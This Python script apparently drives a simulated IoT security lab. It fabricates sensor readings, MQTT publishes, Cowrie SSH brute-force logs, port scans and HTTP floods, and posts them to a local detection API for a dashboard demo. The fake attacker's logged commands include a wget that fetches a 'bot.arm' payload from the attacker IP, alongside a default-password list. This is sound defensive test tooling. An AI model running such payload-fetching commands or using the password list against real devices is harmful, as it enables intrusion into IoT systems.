"""Pretend to be the lab, live, without the hardware: a fake ESP32, a fake MQTT client and a fake attacker send
data to the running API, the same way the real devices will. Open the new dashboard in "Live" mode and watch it.

    cd backend
    .venv/Scripts/python -m api                    # terminal 1: the API on port 8001
    .venv/Scripts/python -m demo.live_sim          # terminal 2: the fake lab (Ctrl+C to stop)
    .venv/Scripts/python -m demo.live_sim --clean  # afterwards: delete everything the simulator sent

What it sends, through the real API endpoints:
  - every 2 s   the ESP32's reading               -> POST /api/v1/ingest/sensor (no time: the server stamps it)
  - every 5 s   an MQTT publish from the ESP32     -> POST /api/v1/ingest/events
  - every ~40 s an SSH brute force from 192.168.56.99 on the gateway:
                Cowrie's JSON log lines            -> POST /api/v1/ingest/logs/cowrie   (what the Pi will send)
                Zeek's conn.log lines for it       -> POST /api/v1/ingest/logs/zeek-conn

With --lab poc it pretends to be the proof-of-concept lab instead (laptop hotspot 192.168.137.1 + ESP32-S3), for an
API started on the aegex_poc database (python -m ingest.poc_db):
  - every 2 s   the ESP32-S3's reading                         -> POST /api/v1/ingest/sensor
  - every ~15 s a phone (192.168.137.20) opens the ESP32's page -> POST /api/v1/ingest/honeypot + zeek-conn
  - every ~40 s the second laptop (192.168.137.50) attacks the ESP32-S3, taking turns: a port scan, an HTTP flood
                Zeek's conn.log lines (scan: many ports; flood: ~200 connections) -> POST /api/v1/ingest/logs/zeek-conn

It opens a "live" capture called cap-sim-<date-time>, so everything it sends is grouped there and the cleanup
knows what to delete. Live data has no labels (label = NULL): only Task A's attack log labels data, after the fact.
On Ctrl+C the capture gets its end time, so it stops catching new data.
"""
from __future__ import annotations

import argparse
import json
import random
import secrets
import sys
import time
from datetime import datetime, timezone

import httpx

GW, ESP, ATTACKER = "192.168.56.10", "192.168.56.20", "192.168.56.99"
POC_ESP, POC_PHONE, POC_ATTACKER = "esp32s3-01", "192.168.137.20", "192.168.137.50"
PASSWORDS = ["123456", "admin", "root", "password", "raspberry", "12345", "toor", "iot", "default", "letmein"]
PREFIX = "cap-sim-"


def iso(ts: float) -> str:
    return datetime.fromtimestamp(ts, timezone.utc).isoformat().replace("+00:00", "Z")


class Lab:
    sensor_device = "esp32-smoke-01"

    def __init__(self, api: str, capture_id: str, seed: int | None) -> None:
        self.api, self.capture_id = api.rstrip("/"), capture_id
        self.http = httpx.Client(timeout=10)
        self.rng = random.Random(seed)
        self.temp, self.hum, self.smoke = 24.0, 40.0, 12.0
        self.sent = {"sensor": 0, "mqtt": 0, "cowrie": 0, "honeypot": 0, "flows": 0}

    @staticmethod
    def conn_line(t: float, src: str, sport: int, dst: str, dport: int, service: str | None, duration: float,
                  orig_bytes: int, resp_bytes: int, state: str = "SF") -> dict:
        """One Zeek conn.log line, as Zeek on the laptop would write it."""
        history = {"SF": "ShAdDaFf", "REJ": "Sr", "S0": "S"}.get(state, "ShAdDaFf")
        pkts = (4 + orig_bytes // 200, 4 + resp_bytes // 200) if state == "SF" else (1, 1 if state == "REJ" else 0)
        return {"ts": t, "uid": "C" + secrets.token_hex(8), "id.orig_h": src, "id.orig_p": sport, "id.resp_h": dst,
                "id.resp_p": dport, "proto": "tcp", "service": service, "duration": round(duration, 3),
                "orig_bytes": orig_bytes, "resp_bytes": resp_bytes, "conn_state": state, "history": history,
                "orig_pkts": pkts[0], "resp_pkts": pkts[1]}

    def flows(self, lines: list[dict]) -> None:
        r = self.post("/api/v1/ingest/logs/zeek-conn", content="\n".join(json.dumps(c) for c in lines),
                      headers={"Content-Type": "text/plain"}, params={"capture_id": self.capture_id})
        self.sent["flows"] += r["inserted"]

    def flow(self, *args, **kwargs) -> None:
        self.flows([self.conn_line(*args, **kwargs)])

    def post(self, path: str, **kwargs) -> dict:
        r = self.http.post(self.api + path, **kwargs)
        if r.status_code >= 300:
            raise RuntimeError(f"{path} answered {r.status_code}: {r.text[:300]}")
        return r.json()

    # ---------------------------------------------------------------- normal traffic
    def sensor(self) -> None:
        if time.time() < getattr(self, "quiet_until", 0):    # flooded: the ESP32 is too busy to send readings
            return
        self.temp += self.rng.uniform(-0.15, 0.15)
        self.hum += self.rng.uniform(-0.3, 0.3)
        self.smoke = max(0.0, self.smoke + self.rng.uniform(-0.6, 0.6))
        self.post("/api/v1/ingest/sensor", json={"device_id": self.sensor_device, "temperature_c": round(self.temp, 2),
                                                  "humidity_pct": round(self.hum, 1), "smoke": round(self.smoke, 1)})
        self.sent["sensor"] += 1

    def mqtt(self) -> None:
        reading = {"smoke": round(self.smoke, 1), "temp": round(self.temp, 2)}
        self.post("/api/v1/ingest/events", json={
            "ts": iso(time.time()), "source": "mosquitto", "event_type": "mqtt_publish", "device_id": "gw-01",
            "src_ip": ESP, "dst_ip": GW, "dst_port": 1883, "proto": "tcp", "severity": "info",
            "payload": {"client_id": "esp32-smoke-01", "topic": "aegex/esp32-smoke-01/telemetry",
                        "payload": json.dumps(reading), "simulated": True}})
        self.sent["mqtt"] += 1

    # ---------------------------------------------------------------- the attacker
    def brute_force(self) -> None:
        """One hydra-like SSH session: connect, a few failed logins, sometimes a success and commands, close."""
        t = time.time() - 3                                   # the session happened over the last few seconds
        session, port = secrets.token_hex(3), self.rng.randint(40000, 60000)
        base = {"session": session, "src_ip": ATTACKER, "sensor": "gw-01"}
        lines = [{"eventid": "cowrie.session.connect", "timestamp": iso(t), "src_port": port, "dst_ip": GW,
                  "dst_port": 22, "protocol": "ssh", **base}]
        tries = self.rng.randint(3, 6)
        for i in range(tries):
            lines.append({"eventid": "cowrie.login.failed", "timestamp": iso(t + 0.3 + i * 0.3), "username": "root",
                          "password": self.rng.choice(PASSWORDS), **base})
        end = t + 0.3 + tries * 0.3
        if self.rng.random() < 0.3:                           # sometimes the attacker gets in
            lines.append({"eventid": "cowrie.login.success", "timestamp": iso(end), "username": "root",
                          "password": "raspberry", **base})
            for j, cmd in enumerate(["uname -a", "cat /proc/cpuinfo", "wget http://192.168.56.99/bot.arm"]):
                lines.append({"eventid": "cowrie.command.input", "timestamp": iso(end + 0.2 + j * 0.2), "input": cmd,
                              **base})
            end += 1.0
        lines.append({"eventid": "cowrie.session.closed", "timestamp": iso(end + 0.1), "duration": round(end - t, 2),
                      **base})
        text = "\n".join(json.dumps(line) for line in lines)
        r = self.post("/api/v1/ingest/logs/cowrie", content=text, headers={"Content-Type": "text/plain"},
                      params={"device_id": "gw-01", "capture_id": self.capture_id})
        self.sent["cowrie"] += r["inserted"]
        self.flow(t, ATTACKER, port, GW, 22, "ssh", end - t, 900 + 120 * tries, 1500 + 90 * tries)
        print(f"  {datetime.now():%H:%M:%S}  attacker {ATTACKER}: SSH session with {tries} failed logins"
              f"{' + login + commands' if len(lines) > tries + 2 else ''}", flush=True)

    def normal(self) -> None:
        """The old lab's normal traffic: an MQTT publish from the ESP32 every 5 s."""
        self.mqtt()


class PocLab(Lab):
    """The proof-of-concept lab: laptop hotspot (192.168.137.1) + one ESP32-S3 honeypot with sensors."""
    sensor_device = POC_ESP

    def __init__(self, api: str, capture_id: str, seed: int | None, esp_ip: str) -> None:
        super().__init__(api, capture_id, seed)
        self.esp_ip = esp_ip

    def honeypot(self, **event) -> None:
        """What the ESP32-S3's fake service sends for one thing a client did."""
        r = self.post("/api/v1/ingest/honeypot", json={"device_id": POC_ESP, "capture_id": self.capture_id, **event})
        self.sent["honeypot"] += r["inserted"]

    def normal(self) -> None:
        """A phone on the hotspot opens the ESP32's status page (normal use, about every 15 s)."""
        if self.rng.random() > 0.33:
            return
        t, port = time.time() - 1, self.rng.randint(40000, 60000)
        self.honeypot(event="http_request", service="http", src_ip=POC_PHONE, src_port=port, dst_port=80,
                      method="GET", path="/", ts=iso(t))
        self.flow(t, POC_PHONE, port, self.esp_ip, 80, "http", 0.2, 350, 2200)

    def brute_force(self) -> None:
        """The second laptop's attacks, taking turns: a port scan, then an HTTP flood."""
        self.n_attacks = getattr(self, "n_attacks", 0) + 1
        (self.port_scan if self.n_attacks % 2 else self.http_flood)()

    def port_scan(self) -> None:
        """Like `nmap -sS 192.168.137.x`: a SYN to many ports in about a second. Closed ports answer with a reset
        (REJ), filtered ones don't answer (S0), the open web port 80 completes. Only Zeek sees this: the ESP32's
        HTTP server never gets a request, so it sends no honeypot event."""
        t = time.time() - 2
        ports = sorted(self.rng.sample([21, 22, 23, 25, 53, 110, 139, 143, 443, 445, 554, 1883, 3306, 3389, 5000, 5900,
                                        8000, 8080, 8443, 8883, 9000, 49152], 18) + [80])
        sport = self.rng.randint(40000, 60000)
        lines = []
        for i, port in enumerate(ports):
            state = "SF" if port == 80 else ("S0" if self.rng.random() < 0.2 else "REJ")
            lines.append(self.conn_line(t + i * 0.05, POC_ATTACKER, sport, self.esp_ip, port,
                                        "http" if port == 80 else None, 0.01, 0, 0, state))
        self.flows(lines)
        print(f"  {datetime.now():%H:%M:%S}  attacker {POC_ATTACKER}: port scan on the ESP32-S3, {len(ports)} ports",
              flush=True)

    def http_flood(self) -> None:
        """An HTTP flood (e.g. a loop of curl / ab / hping3): ~200 requests in 5 s on the ESP32's web page. The
        ESP32 is overwhelmed: it logs only some requests and stops sending sensor readings for a while."""
        t, n = time.time() - 5, self.rng.randint(150, 250)
        lines = [self.conn_line(t + i * 5 / n, POC_ATTACKER, self.rng.randint(40000, 60000), self.esp_ip, 80, "http",
                                0.05, 120, 0 if self.rng.random() < 0.4 else 2200,
                                "SF" if self.rng.random() < 0.6 else "S0") for i in range(n)]
        self.flows(lines)
        for i in range(10):                                   # the few requests the ESP32 managed to log
            self.honeypot(event="http_request", service="http", src_ip=POC_ATTACKER, dst_port=80, method="GET",
                          path="/", ts=iso(t + i * 0.5), esp_ms=int((t + i * 0.5) * 1000))
        self.quiet_until = time.time() + 12
        print(f"  {datetime.now():%H:%M:%S}  attacker {POC_ATTACKER}: HTTP flood on the ESP32-S3, {n} connections "
              f"in 5 s (sensor goes quiet for 12 s)", flush=True)


def close_capture(capture_id: str) -> None:
    """There is no API call to close a capture yet, so set its end time in the database directly."""
    from ingest.db import connect
    with connect() as conn:
        conn.execute("UPDATE captures SET end_ts = now() WHERE capture_id = %s AND end_ts IS NULL", (capture_id,))


def clean() -> None:
    from ingest.db import connect
    with connect() as conn, conn.transaction():
        for table in ("feature_windows", "flows", "events", "attack_runs", "captures"):
            n = conn.execute(f"DELETE FROM {table} WHERE capture_id LIKE %s", (PREFIX + "%",)).rowcount
            print(f"deleted {n} rows from {table}")


def main() -> int:
    ap = argparse.ArgumentParser(description="A fake lab that sends live data to the API.")
    ap.add_argument("--api", default="http://127.0.0.1:8001", help="the API address (default: %(default)s)")
    ap.add_argument("--attack-every", type=float, default=40, help="seconds between brute-force sessions")
    ap.add_argument("--minutes", type=float, default=0, help="stop after this many minutes (0 = until Ctrl+C)")
    ap.add_argument("--seed", type=int, default=None)
    ap.add_argument("--clean", action="store_true", help="delete everything the simulator sent (cap-sim-* captures)")
    ap.add_argument("--lab", choices=["sample", "poc"], default="sample",
                    help="sample: the old 3-device lab (database aegex). poc: laptop hotspot + ESP32-S3 (database "
                         "aegex_poc). Default: %(default)s")
    args = ap.parse_args()
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    if args.clean:
        clean()
        return 0

    capture_id = PREFIX + datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    api = args.api.rstrip("/")
    try:
        health = httpx.get(api + "/health", timeout=10)
        health.raise_for_status()
        devices = {d["device_id"]: d["ip"] for d in httpx.get(api + "/api/v1/devices", timeout=10).json()["items"]}
    except httpx.HTTPError as exc:
        print(f"The API is not reachable at {api} ({type(exc).__name__}). Start it first: .venv/Scripts/python -m api")
        return 1
    wanted = POC_ESP if args.lab == "poc" else "esp32-smoke-01"
    if wanted not in devices:
        db = health.json().get("database_name")
        hint = ("for --lab poc, create the PoC database (python -m ingest.poc_db) and start the API with "
                '$env:AEGEX_DB_URL = "postgresql://aegex:aegex@127.0.0.1:5433/aegex_poc"' if args.lab == "poc"
                else "for the sample lab, start the API without AEGEX_DB_URL (database aegex)")
        print(f"The API uses database '{db}', which has no device {wanted}: {hint}.")
        return 1
    lab = PocLab(api, capture_id, args.seed, devices[POC_ESP]) if args.lab == "poc" else Lab(api, capture_id, args.seed)
    lab.post("/api/v1/captures", json={"capture_id": capture_id, "start_ts": iso(time.time() - 5), "kind": "live",
                                        "notes": "demo.live_sim: simulated live data, not real"})
    print(f"Fake lab running -> {lab.api}, capture {capture_id}. Open the new dashboard in Live mode. Ctrl+C to stop.")

    started, last_mqtt, next_attack = time.time(), 0.0, time.time() + 8
    try:
        while not args.minutes or time.time() - started < args.minutes * 60:
            lab.sensor()
            if time.time() - last_mqtt >= 5:
                lab.normal()
                last_mqtt = time.time()
            if time.time() >= next_attack:
                lab.brute_force()
                next_attack = time.time() + args.attack_every * lab.rng.uniform(0.7, 1.3)
            time.sleep(2)
    except KeyboardInterrupt:
        pass
    finally:
        close_capture(capture_id)
        print(f"\nStopped. Sent: {lab.sent['sensor']} sensor readings, {lab.sent['mqtt']} MQTT publishes, "
              f"{lab.sent['cowrie']} Cowrie events, {lab.sent['honeypot']} ESP32 honeypot events, "
              f"{lab.sent['flows']} flows. Capture {capture_id} closed.")
        print("Delete it all with: .venv/Scripts/python -m demo.live_sim --clean")
    return 0


if __name__ == "__main__":
    sys.exit(main())
